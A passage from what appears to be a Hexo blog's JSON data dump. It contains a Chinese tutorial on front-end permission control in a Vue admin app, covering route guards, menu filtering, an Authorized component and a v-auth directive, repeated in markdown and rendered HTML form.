notification.error({\n        message: \"403\",\n        description: \"你没有权限访问，请联系管理员咨询。\"\n      });\n      next({\n        path: \"/403\"\n      });\n    }\n    NProgress.done();\n  }\n  next();\n});\n\nrouter.afterEach(() => {\n  NProgress.done();\n});\n```\n\n## 菜单控制\n\n思路就是判断权限，过滤显示菜单内容。例如基于之前动态生成菜单的实现方式，可以如下处理：\n\n```js\nlet menuData = [];\nfor (let element of routes) {\n  if (\n    element.meta &&\n    element.meta.authority &&\n    !check(element.meta.authority)\n  ) {\n    break;\n  }\n  ...\n  return menuData;\n}\n```\n\n## 精细化权限控制\n\n### 权限组件\n\n首选创建一个组件`Authorized.vue`，这里用函数式组件比较合适：\n\n```js\n<script>\nimport { check } from \"../utils/auth\";\nexport default {\n  // 指定该组件为函数式组件\n  functional: true,\n  props: {\n    authority: {\n      type: Array,\n      required: true\n    }\n  },\n  render(h, context) {\n    const { props, scopedSlots } = context;\n    return check(props.authority) ? scopedSlots.default() : null;\n  }\n};\n</script>\n```\n\n然后注册组件，推荐全局注册：\n\n```js\nimport Authorized from \"./components/Authorized\";\nVue.component(\"Authorized\", Authorized);\n```\n\n最后就可以在具体页面中使用了：\n\n```html\n<Authorized :authority=\"['admin']\">\n  <div>我是只有admin权限的用户才能看到的内容模块</div>\n</Authorized>\n```\n\n### 权限指令\n\n首先创建一个指令插件 `auth.js`：\n\n```js\nimport { check } from \"../utils/auth\";\n// 提供install方法（语法）\nfunction install(Vue, options = {}) {\n  // 定义指令\n  Vue.directive(options.name || \"auth\", {\n    // 钩子函数\n    inserted(el, binding) {\n      if (!check(binding.value)) {\n        el.parentNode && el.parentNode.removeChild(el);\n      }\n    }\n  });\n}\n\nexport default { install };\n```\n\n然后全局注册插件：\n\n```js\nimport Auth from \"./directives/auth\";\nVue.use(Auth);\n```\n\n最后就可以在需要的元素上使用该指令了：\n\n```html\n<a-icon\n  v-auth=\"['admin']\"\n  class=\"trigger\"\n  :type=\"collapsed ? 'menu-unfold' : 'menu-fold'\"\n  @click=\"foldHandler\"\n/>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n","slug":"vue-in-action-auth","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xk006cwovvdhfvk7fn","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在管理系统中权限控制是一个必不可少的组成部分，包括路由控制，菜单控制，内容区控制等。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"路由控制\"><a href=\"#路由控制\" class=\"headerlink\" title=\"路由控制\"></a>路由控制</h2><h3 id=\"辅助函数\"><a href=\"#辅助函数\" class=\"headerlink\" title=\"辅助函数\"></a>辅助函数</h3><p>首先可以在项目想创建 utils 文件夹，然后创建 auth.js 文件，编写需要的功能函数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCurrentAuthority</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 后端返回用户角色</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> [<span class=\"string\">\"user\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\">authority</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current.some(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> authority.includes(item));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isLogin</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current &amp;&amp; current[<span class=\"number\">0</span>] !== <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"导航守卫\"><a href=\"#导航守卫\" class=\"headerlink\" title=\"导航守卫\"></a>导航守卫</h3><p>配置路由导航守卫，控制前端路由跳转。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.beforeEach(<span class=\"function\">(<span class=\"params\">to, <span class=\"keyword\">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to.path !== <span class=\"keyword\">from</span>.path) &#123;</span><br><span class=\"line\">    NProgress.start();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> record = findLast(to.matched, item =&gt; item.meta.authority);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (record &amp;&amp; !check(record.meta.authority)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isLogin() &amp;&amp; to.path !== <span class=\"string\">\"/user/login\"</span>) &#123;</span><br><span class=\"line\">      next(&#123;</span><br><span class=\"line\">        path: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (to.path !== <span class=\"string\">\"/403\"</span>) &#123;</span><br><span class=\"line\">      notification.error(&#123;</span><br><span class=\"line\">        message: <span class=\"string\">\"403\"</span>,</span><br><span class=\"line\">        description: <span class=\"string\">\"你没有权限访问，请联系管理员咨询。\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      next(&#123;</span><br><span class=\"line\">        path: <span class=\"string\">\"/403\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    NProgress.done();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.afterEach(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  NProgress.done();</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"菜单控制\"><a href=\"#菜单控制\" class=\"headerlink\" title=\"菜单控制\"></a>菜单控制</h2><p>思路就是判断权限，过滤显示菜单内容。例如基于之前动态生成菜单的实现方式，可以如下处理：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> menuData = [];</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> element <span class=\"keyword\">of</span> routes) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (</span><br><span class=\"line\">    element.meta &amp;&amp;</span><br><span class=\"line\">    element.meta.authority &amp;&amp;</span><br><span class=\"line\">    !check(element.meta.authority)</span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> menuData;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"精细化权限控制\"><a href=\"#精细化权限控制\" class=\"headerlink\" title=\"精细化权限控制\"></a>精细化权限控制</h2><h3 id=\"权限组件\"><a href=\"#权限组件\" class=\"headerlink\" title=\"权限组件\"></a>权限组件</h3><p>首选创建一个组件<code>Authorized.vue</code>，这里用函数式组件比较合适：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; check &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../utils/auth\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 指定该组件为函数式组件</span></span><br><span class=\"line\">  functional: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    authority: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Array</span>,</span><br><span class=\"line\">      required: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  render(h, context) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; props, scopedSlots &#125; = context;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> check(props.authority) ? scopedSlots.default() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后注册组件，推荐全局注册：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Authorized <span class=\"keyword\">from</span> <span class=\"string\">\"./components/Authorized\"</span>;</span><br><span class=\"line\">Vue.component(<span class=\"string\">\"Authorized\"</span>, Authorized);</span><br></pre></td></tr></table></figure>\n<p>最后就可以在具体页面中使用了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Authorized</span> <span class=\"attr\">:authority</span>=<span class=\"string\">\"['admin']\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>我是只有admin权限的用户才能看到的内容模块<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">Authorized</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"权限指令\"><a href=\"#权限指令\" class=\"headerlink\" title=\"权限指令\"></a>权限指令</h3><p>首先创建一个指令插件 <code>auth.js</code>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; check &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../utils/auth\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 提供install方法（语法）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">install</span>(<span class=\"params\">Vue, options = &#123;&#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 定义指令</span></span><br><span class=\"line\">  Vue.directive(options.name || <span class=\"string\">\"auth\"</span>, &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 钩子函数</span></span><br><span class=\"line\">    inserted(el, binding) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!check(binding.value)) &#123;</span><br><span class=\"line\">        el.parentNode &amp;&amp; el.parentNode.removeChild(el);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123; install &#125;;</span><br></pre></td></tr></table></figure>\n<p>然后全局注册插件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Auth <span class=\"keyword\">from</span> <span class=\"string\">\"./directives/auth\"</span>;</span><br><span class=\"line\">Vue.use(Auth);</span><br></pre></td></tr></table></figure>\n<p>最后就可以在需要的元素上使用该指令了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a-icon</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-auth</span>=<span class=\"string\">\"['admin']\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">class</span>=<span class=\"string\">\"trigger\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:type</span>=<span class=\"string\">\"collapsed ? 'menu-unfold' : 'menu-fold'\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  @<span class=\"attr\">click</span>=<span class=\"string\">\"foldHandler\"</span></span></span><br><span class=\"line\"><span class=\"tag\">/&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在管理系统中权限控制是一个必不可少的组成部分，包括路由控制，菜单控制，内容区控制等。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"路由控制\"><a href=\"#路由控制\" class=\"headerlink\" title=\"路由控制\"></a>路由控制</h2><h3 id=\"辅助函数\"><a href=\"#辅助函数\" class=\"headerlink\" title=\"辅助函数\"></a>辅助函数</h3><p>首先可以在项目想创建 utils 文件夹，然后创建 auth.js 文件，编写需要的功能函数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCurrentAuthority</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 后端返回用户角色</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> [<span class=\"string\">\"user\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\">authority</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current.some(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> authority.includes(item));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isLogin</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current &amp;&amp; current[<span class=\"number\">0</span>] !== <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"导航守卫\"><a href=\"#导航守卫\" class=\"headerlink\" title=\"导航守卫\"></a>导航守卫</h3><p>配置路由导航守卫，控制前端路由跳转。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.beforeEach(<span class=\"function\">(<span class=\"params\">to, <span class=\"keyword\">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to.path !== <span class=\"keyword\">from</span>.path) &#123;</span><br><span class=\"line\">    NProgress.start();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> record = findLast(to.matched, item =&gt; item.meta.authority);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (record &amp;&amp; !check(record.meta.authority)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isLogin() &amp;&amp; to.path !== <span class=\"string\">\"/user/login\"</span>) &#123;</span><br><span class=\"line\">      next(&#123;</span><br><span class=\"line\">        path: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (to.path !== <span class=\"string\">\"/403\"</span>) &#123;</span><br><span class=\"line\">      notification.error(&#123;</span><br><span class=\"line\">        message: <span class=\"string\">\"403\"</span>,</span><br><span class=\"line\">        description: <span class=\"string\">\"你没有权限访问，请联系管理员咨询。\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      next(&#123;</span><br><span class=\"line\">        path: <span class=\"string\">\"/403\"</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    NProgress.done();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.afterEach(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  NProgress.done();</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"菜单控制\"><a href=\"#菜单控制\" class=\"headerlink\" title=\"菜单控制\"></a>菜单控制</h2><p>思路就是判断权限，过滤显示菜单内容。例如基于之前动态生成菜单的实现方式，可以如下处理：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> menuData = [];</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> element <span class=\"keyword\">of</span> routes) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (</span><br><span class=\"line\">    element.meta &amp;&amp;</span><br><span class=\"line\">    element.meta.authority &amp;&amp;</span><br><span class=\"line\">    !check(element.meta.authority)</span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> menuData;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"精细化权限控制\"><a href=\"#精细化权限控制\" class=\"headerlink\" title=\"精细化权限控制\"></a>精细化权限控制</h2><h3 id=\"权限组件\"><a href=\"#权限组件\" class=\"headerlink\" title=\"权限组件\"></a>权限组件</h3><p>首选创建一个组件<code>Authorized.vue</code>，这里用函数式组件比较合适：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; check &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../utils/auth\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 指定该组件为函数式组件</span></span><br><span class=\"line\">  functional: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    authority: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Array</span>,</span><br><span class=\"line\">      required: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  render(h, context) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; props, scopedSlots &#125; = context;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> check(props.authority) ? scopedSlots.default() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后注册组件，推荐全局注册：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Authorized <span class=\"keyword\">from</span> <span class=\"string\">\"./components/Authorized\"</span>;</span><br><span class=\"line\">Vue.component(<span class=\"string\">\"Authorized\"</span>, Authorized);</span><br></pre></td></tr></table></figure>\n<p>最后就可以在具体页面中使用了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Authorized</span> <span class=\"attr\">:authority</span>=<span class=\"string\">\"['admin']\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>我是只有admin权限的用户才能看到的内容模块<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">Authorized</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"权限指令\"><a href=\"#权限指令\" class=\"headerlink\" title=\"权限指令\"></a>权限指令</h3><p>首先创建一个指令插件 <code>auth.js</code>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; check &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../utils/auth\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 提供install方法（语法）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">install</span>(<span class=\"params\">Vue, options = &#123;&#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 定义指令</span></span><br><span class=\"line\">  Vue.directive(options.name || <span class=\"string\">\"auth\"</span>, &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 钩子函数</span></span><br><span class=\"line\">    inserted(el, binding) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!check(binding.value)) &#123;</span><br><span class=\"line\">        el.parentNode &amp;&amp; el.parentNode.removeChild(el);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123; install &#125;;</span><br></pre></td></tr></table></figure>\n<p>然后全局注册插件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Auth <span class=\"keyword\">from</span> <span class=\"string\">\"./directives/auth\"</span>;</span><br><span class=\"line\">Vue.use(Auth);</span><br></pre></td></tr></table></figure>\n<p>最后就可以在需要的元素上使用该指令了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a-icon</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-auth</span>=<span class=\"string\">\"['admin']\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">class</span>=<span class=\"string\">\"trigger\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:type</span>=<span class=\"string\">\"collapsed ? 'menu-unfold' : 'menu-fold'\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  @<span class=\"attr\">click</span>=<span class=\"string\">\"foldHandler\"</span></span></span><br><span class=\"line\"><span class=\"tag\">/&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@ant-disign第一坑","date":"2019-05-20T02:25:48.000Z","updated":"2019-05-20T02:25:48.000Z","_content":"\n# 概述\n\n第一次用 ant-design-vue，刚启动就踩坑，记录下。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\nvue-cli3.x 创建项目\n\n按需引用 ant-design-vue 组件\n\n```shell\nnpm install ant-design-vue --save\nnpm install babel-plugin-import 